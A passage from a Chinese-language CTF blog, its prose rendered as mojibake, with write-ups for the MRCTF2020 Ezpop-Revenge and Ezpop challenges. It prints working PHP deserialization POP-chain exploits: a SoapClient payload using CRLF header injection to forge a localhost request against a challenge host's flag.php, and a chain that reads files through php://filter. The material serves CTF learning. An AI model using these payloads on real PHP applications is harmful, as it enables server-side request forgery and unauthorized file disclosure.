class="line">$c-&gt;not_exists_function();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/images/MRCTF2020-Ezpop-Revenge/image-20210404173005718.png" alt="image-20210404173005718"></p>
<p>è°ƒç”¨ä¸å­˜åœ¨çš„æ–¹æ³•æ—¶ï¼ŒSoapClientä»ä¼šå‘WebSeverå‘é€è¯·æ±‚ï¼Œè°ƒç”¨æœåŠ¡å™¨å‡½æ•°ã€‚</p>
<p>åœ¨å‚æ•°ä¸­ï¼Œuser-agentæ˜¯å¯æ§çš„ï¼Œè¿™æ„å‘³ç€é€šè¿‡<strong>CRLF</strong>ï¼Œæˆ‘ä»¬å¯ä»¥æ§åˆ¶uaä¸‹çš„æ‰€æœ‰å‚æ•°ï¼Œè¿›è€Œå€Ÿç½‘ç«™å‘é€ä¸€ä¸ªç”±æˆ‘ä»¬æ§åˆ¶çš„POSTè¯·æ±‚ï¼Œå®Œæˆssrfã€‚</p>
<p>popé“¾å·²ç»æ˜äº†äº†(å¤§æ¦‚)ï¼š</p>
<ol>
<li>HelloWorld_DBååºåˆ—åŒ–è§¦å‘wakeupï¼Œåœ¨wakeupä¸­å®ä¾‹åŒ–ä¸€ä¸ªTypecho_Dbï¼›</li>
<li><code>Typecho_Db($this-&gt;coincidence[&#39;hello&#39;], $this-&gt;coincidence[&#39;world&#39;])</code>ï¼Œ<code>$this-&gt;coincidence[&#39;world&#39;]</code>ä½œä¸ºå‚æ•°ï¼Œä¹Ÿå°±æ˜¯<code>$adapterName</code>ï¼Œæ§åˆ¶æ­¤å‚æ•°ä¸º<code>Typecho_Db_Query</code>çš„å®ä¾‹åŒ–ï¼Œè§¦å‘toStringï¼›</li>
<li>Typecho_Db_Queryä¸­æ§åˆ¶<code>$this-&gt;_sqlPreBuild[&#39;action&#39;]</code>ä¸ºselectï¼Œ<code>$this-&gt;_adapter</code>ä¸ºSoapClientçš„å®ä¾‹åŒ–ï¼Œè§¦å‘å…¶ä¸­çš„callæ–¹æ³•ï¼Œå‘é€postè¯·æ±‚è¿›è¡Œssrfã€‚</li>
</ol>
<p>æ˜äº†å½’æ˜äº†ï¼Œå†™è„šæœ¬ä¹Ÿæ˜¯ä¸€å¤§éš¾å…³â€¦â€¦å¹¶ä¸”è¦å¯¹å„ä¸ªç±»é‡Œçš„é­”æœ¯æ–¹æ³•æœ‰æ•°ï¼Œè¿™æ ·æ‰èƒ½æ„é€ å‡ºæ­£ç¡®çš„åºåˆ—åŒ–å­—ç¬¦ä¸²ã€‚</p>
<p>â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦æ— è¯­å‡å™</p>
<p>åˆ©ç”¨ç±»é‡Œæœ‰çš„constructæ§åˆ¶å˜é‡ï¼Œä¼ å…¥targetä¸º<code>http://92018a96-f259-4c67-9a5a-b95fedc9d0ea.node3.buuoj.cn/flag.php</code>è®¾ç½®å¥½xffå¤´å’Œè‡ªå·±çš„cookieï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloWorld_DB</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $coincidence;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;coincidence = <span class="keyword">array</span>(<span class="string">&quot;hello&quot;</span> =&gt; <span class="keyword">new</span> Typecho_Db_Query());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Db_Query</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $_adapter;</span><br><span class="line">    <span class="keyword">private</span> $_sqlPreBuild;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $target = <span class="string">&quot;http://92018a96-f259-4c67-9a5a-b95fedc9d0ea.node3.buuoj.cn/flag.php&quot;</span>;</span><br><span class="line">        $headers = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&#x27;X-Forwarded-For:127.0.0.1&#x27;</span>,</span><br><span class="line">            <span class="string">&quot;Cookie: PHPSESSID=a55efu5tcvab970c7j54jbfkj3&quot;</span></span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_adapter = <span class="keyword">new</span> SoapClient(<span class="literal">null</span>, <span class="keyword">array</span>(<span class="string">&#x27;uri&#x27;</span> =&gt; <span class="string">&#x27;aaab&#x27;</span>, <span class="string">&#x27;location&#x27;</span> =&gt; $target, <span class="string">&#x27;user_agent&#x27;</span> =&gt; <span class="string">&#x27;haha^^&#x27;</span> . join(<span class="string">&#x27;^^&#x27;</span>, $headers)));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;_sqlPreBuild = [<span class="string">&#x27;action&#x27;</span> =&gt; <span class="string">&quot;SELECT&quot;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = serialize(<span class="keyword">new</span> HelloWorld_DB());</span><br><span class="line"></span><br><span class="line"><span class="comment">//echo $a;</span></span><br><span class="line"></span><br><span class="line">$a = preg_replace(<span class="string">&quot; /\^\^/&quot;</span>, <span class="string">&quot;\r\n&quot;</span>, $a);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> base64_encode($a);</span><br><span class="line"></span><br><span class="line">unserialize($_GET[<span class="string">&#x27;pop&#x27;</span>]);</span><br></pre></td></tr></table></figure>

<p>ï¼ˆå¤§æ¦‚å¯ä»¥å§â€¦â€¦â€¦â€¦</p>
<p>æœ€åå¦‚ä½•è¯¥å¦‚ä½•åˆ©ç”¨ååºåˆ—åŒ–ï¼š</p>
<p>åœ¨å¦ä¸€ä¸ªPlugin.phpä¸­ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">activate</span>(<span class="params">$pluginName</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="built_in">self</span>::$_plugins[<span class="string">&#x27;activated&#x27;</span>][$pluginName] = <span class="built_in">self</span>::$_tmp;</span><br><span class="line">        <span class="built_in">self</span>::$_tmp = <span class="keyword">array</span>();</span><br><span class="line">        Helper::addRoute(<span class="string">&quot;page_admin_action&quot;</span>,<span class="string">&quot;/page_admin&quot;</span>,<span class="string">&quot;HelloWorld_Plugin&quot;</span>,<span class="string">&#x27;action&#x27;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Helper.php</span></span><br><span class="line">     * å¢åŠ è·¯ç”±</span><br><span class="line">     * @access <span class="keyword">public</span></span><br><span class="line">     * @param <span class="keyword">string</span> $name è·¯ç”±åç§°</span><br><span class="line">     * @param <span class="keyword">string</span> $url è·¯ç”±è·¯å¾„</span><br><span class="line">     * @param <span class="keyword">string</span> $widget ç»„ä»¶åç§°</span><br><span class="line">     * @param <span class="keyword">string</span> $action ç»„ä»¶åŠ¨ä½œ</span><br><span class="line">     * @param <span class="keyword">string</span> $after åœ¨æŸä¸ªè·¯ç”±åé¢</span><br><span class="line">     * @<span class="keyword">return</span> <span class="keyword">integer</span> */</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">addRoute</span>(<span class="params">$name, $url, $widget, $action = <span class="literal">NULL</span>, $after = <span class="literal">NULL</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $routingTable = <span class="built_in">self</span>::options()-&gt;routingTable;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>($routingTable[<span class="number">0</span>])) &#123;</span><br><span class="line">            <span class="keyword">unset</span>($routingTable[<span class="number">0</span>]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $pos = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">foreach</span> ($routingTable <span class="keyword">as</span> $key =&gt; $val) &#123;</span><br><span class="line">            $pos ++;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ($key == $after) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        $pre = array_slice($routingTable, <span class="number">0</span>, $pos);</span><br><span class="line">        $next = array_slice($routingTable, $pos);</span><br><span class="line"></span><br><span class="line">        $routingTable = array_merge($pre, <span class="keyword">array</span>($name =&gt; <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&#x27;url&#x27;</span>       =&gt;  $url,</span><br><span class="line">            <span class="string">&#x27;widget&#x27;</span>    =&gt;  $widget,</span><br><span class="line">            <span class="string">&#x27;action&#x27;</span>    =&gt;  $action</span><br><span class="line">        )), $next);</span><br><span class="line">        <span class="built_in">self</span>::options()-&gt;routingTable = $routingTable;</span><br><span class="line"></span><br><span class="line">        $db = Typecho_Db::get();</span><br><span class="line">        <span class="keyword">return</span> Typecho_Widget::widget(<span class="string">&#x27;Widget_Abstract_Options&#x27;</span>)-&gt;update(<span class="keyword">array</span>(<span class="string">&#x27;value&#x27;</span> =&gt; serialize($routingTable))</span><br><span class="line">        , $db-&gt;sql()-&gt;where(<span class="string">&#x27;name = ?&#x27;</span>, <span class="string">&#x27;routingTable&#x27;</span>));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/a3320315/article/details/105215741">https://blog.csdn.net/a3320315/article/details/105215741</a> </p>
<p>æ ¹æ®è¿™ç¯‡æ–‡ç« çš„è¯´æ³•ï¼Œç½‘é¡µä¸Šçš„æ’ä»¶(Widget)ä¸€èˆ¬ç”±è·¯ç”±åˆ†å‘æ¥è‡ªåŠ¨åŠ è½½ï¼Œåºåˆ—åŒ–ç‚¹ï¼š<img src="/images/MRCTF2020-Ezpop-Revenge/image-20210404182121878.png" alt="image-20210404182121878"></p>
<p>ç”±æ­¤ï¼Œå¯¹åº”çš„<code> * @param string $widget ç»„ä»¶åç§°</code>ä¹Ÿå°±æ˜¯<code>HelloWorld_Plugin</code>ï¼ŒæŸ¥æ‰¾ç›¸å…³çš„æ’ä»¶åä¸€èˆ¬å°±å¯ä»¥æ‰¾åˆ°è·¯ç”±â€¦â€¦ï¼ˆè¿™ä¸ªä¸€èˆ¬ï¼Œå¤§æ¦‚æ˜¯æˆ‘èƒ¡è¯´çš„â€¦â€¦å› ä¸ºæˆ‘æ ¹æœ¬ä¸æ‡‚â€¦â€¦ğŸ˜­zhendecai</p>
<blockquote>
<p>*è¿™å¥ä»£ç çš„æ„æ€å¤§æ¦‚å°±æ˜¯è®¿é—®<code>/page_admin</code>çš„æ—¶å€™ï¼Œä¼šè‡ªåŠ¨åŠ è½½<code>HelloWorld_Plugin</code>ç±»ï¼Œè€Œä¸”ä¼šè‡ªåŠ¨è°ƒç”¨<code>action</code>å‡½æ•°ï¼Œæ‰€ä»¥æˆ‘ä»¬åˆ©ç”¨ç‚¹çš„è·¯ç”±ä¸º<code>/page_admin</code>*ã€‚</p>
</blockquote>
<p>æœ€åæ˜¯æ–‡ä»¶ä¸­å¸¦æœ‰çš„flag.phpï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION)) session_start();</span><br><span class="line"><span class="keyword">if</span>($_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]===<span class="string">&quot;127.0.0.1&quot;</span>)&#123;</span><br><span class="line">   $_SESSION[<span class="string">&#x27;flag&#x27;</span>]= <span class="string">&quot;MRCTF&#123;******&#125;&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">echo</span> <span class="string">&quot;æˆ‘æ‰Œyour problem?\nonly localhost can get flag!&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>å¦‚æœæ˜¯å†…ç½‘è®¿é—®ï¼Œåˆ™flagå†™å…¥sessionï¼Œåˆ©ç”¨ç‚¹ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_REQUEST[<span class="string">&#x27;admin&#x27;</span>])) var_dump($_SESSION);</span><br></pre></td></tr></table></figure>

<p>ä¼ å…¥adminå‚æ•°æ‰“å°sessionè·å–flagâ€¦â€¦</p>
<p><img src="/images/MRCTF2020-Ezpop-Revenge/image-20210404183523393.png" alt="image-20210404183523393"></p>
<blockquote>
<p>è¿™é¢˜â€¦â€¦å¥½åƒè¿˜æœ‰å¾ˆç±»ä¼¼çš„é¢˜ï¼Œå¤§æ¦‚ç®—æ˜¯çœŸå®ç¯å¢ƒä¸‹çš„ååºåˆ—åŒ–ä»£ç å®¡è®¡ï¼Ÿä¸æ¸…æ¥šï¼Œæˆ‘å•¥éƒ½ä¸çŸ¥é“ğŸ•</p>
<p>ç»å¸¸çœ‹äº†åé¢å¿˜å‰é¢â€¦â€¦ä¹Ÿç®—æ˜¯ä¸€ç§é”»ç‚¼å§ï¼Œå¤šç§¯ç´¯ç»éªŒâ€¦â€¦</p>
</blockquote>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2021/04/03/MRCTF2020-Ezpop/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/header.jpg">
      <meta itemprop="name" content="inanb">
      <meta itemprop="description" content="é“é©¬å†°æ²³å…¥æ¢¦æ¥">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="inanb">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/04/03/MRCTF2020-Ezpop/" class="post-title-link" itemprop="url">MRCTF2020-Ezpop</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>
              

              <time title="åˆ›å»ºæ—¶é—´ï¼š2021-04-03 15:56:52 / ä¿®æ”¹æ—¶é—´ï¼š16:09:50" itemprop="dateCreated datePublished" datetime="2021-04-03T15:56:52+08:00">2021-04-03</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="MRCTF2020-Ezpop"><a href="#MRCTF2020-Ezpop" class="headerlink" title="[MRCTF2020]Ezpop"></a>[MRCTF2020]Ezpop</h2><p>é¢˜ç›®ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in flag.php</span></span><br><span class="line"><span class="comment">//WTF IS THIS?</span></span><br><span class="line"><span class="comment">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span></span><br><span class="line"><span class="comment">//And Crack It!</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  $var;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params">$value</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;append(<span class="keyword">$this</span>-&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$file=<span class="string">&#x27;index.php&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = $file;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Welcome to &#x27;</span>.<span class="keyword">$this</span>-&gt;source.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $p;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params">$key</span>)</span>&#123;</span><br><span class="line">        $function = <span class="keyword">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> $function();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    @unserialize($_GET[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    $a=<span class="keyword">new</span> Show;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>æç¤ºåœ¨flag.phpï¼Œåº”è¯¥æ˜¯åˆ©ç”¨includeè¿›è¡Œè¯»å–ï¼Œæ„é€ popé“¾ï¼š</p>
<p>class Showï¼šwakeupã€toString</p>
<p>class Testï¼šget</p>
<p>class Modifierï¼šinvokeã€include</p>
<p>å¯ä»¥çœ‹å‡ºæ¥ï¼ŒShowç±»åº”å½“æ˜¯å…¥å£ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>åœ¨å¯¹sourceè¿‡æ»¤æ˜¯æ˜¯ä¸€ç§å­—ç¬¦ä¸²æ“ä½œï¼Œè¿™é‡Œå¯ä»¥è·³åˆ°toStringæ–¹æ³•ä¸­</p>
<p>è€ŒtoStringæ˜æ˜¾è°ƒç”¨äº†ä¸€ä¸ªå±æ€§å€¼ï¼Œgetåˆ°ä¸å­˜åœ¨çš„å±æ€§ï¼Œè¿›å…¥Testï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params">$key</span>)</span>&#123;</span><br><span class="line">        $function = <span class="keyword">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> $function();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>å‡½æ•°å½¢å¼è°ƒç”¨æ–¹æ³•ï¼Œinvokeï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span>  $var;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params">$value</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">include</span>($value);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;append(<span class="keyword">$this</span>-&gt;var);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åˆ©ç”¨æ–¹æ³•æ˜¯å¾ˆæ˜æ˜¾çš„ï¼Œæˆ‘ä»¬åªéœ€è¦æ§åˆ¶$varä¸ºæˆ‘ä»¬æƒ³è¦çš„å°±å¯ä»¥è¿›è¡ŒåŒ…å«ä»»æ„è¯»å–</p>
<p>å¦ï¼Œæ³¨æ„è¿™é‡Œæ˜¯ç§æœ‰ä¿æŠ¤å˜é‡ï¼Œè¦ä¼ ä¸€ä¸ªurlåŠ å¯†çš„åºåˆ—åŒ–å­—ç¬¦ä¸²ä¿è¯æ­£ç¡®çš„è§£æ</p>
<blockquote>
<p><strong><em>Help Me Find FLAG!</em></strong></p>
</blockquote>
<p>ä¼°è®¡æ˜¯è—èµ·æ¥äº†ï¼Œä¸Šä¼ªåè®®</p>
<blockquote>
<p><strong><em>php://filter/read=convert.base64-encode/resource=flag.php</em></strong></p>
</blockquote>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $flag= <span class="string">&quot;flag&#123;81ade5a5-3fc1-455b-bec8-5adbc83dfd1b&#125;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Help Me Find FLAG!&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>expï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$m = <span class="keyword">new</span> Modifier();</span><br><span class="line">$t = <span class="keyword">new</span> Test();</span><br><span class="line">$s = <span class="keyword">new</span> Show();</span><br><span class="line">$ss=<span class="keyword">new</span> Show();</span><br><span class="line">$s-&gt;source=$ss;</span><br><span class="line">$s-&gt;source-&gt;str=$t;</span><br><span class="line">$s-&gt;source-&gt;str-&gt;p=<span class="keyword">new</span> Modifier();</span><br><span class="line">$k = serialize($s);</span><br><span class="line"><span class="keyword">echo</span> urlencode($k);</span><br></pre></td></tr></table></figure>

<p>â€¦â€¦ok</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2021/04/02/0CTF-2016-piapiapia/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/header.jpg">
      <meta itemprop="name" content="inanb">
      <meta itemprop="description" content="é“é©¬å†°æ²³å…¥æ¢¦æ¥">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="inanb">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/04/02/0CTF-2016-piapiapia/" class="post-title-link" itemprop="url">0CTF-2016-piapiapia</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>
              

              <time title="åˆ›å»ºæ—¶é—´ï¼š2021-04-02 19:33:54 / ä¿®æ”¹æ—¶é—´ï¼š20:15:51" itemprop="dateCreated datePublished" datetime="2021-04-02T19:33:54+08:00">2021-04-02</time>
            </span>

          

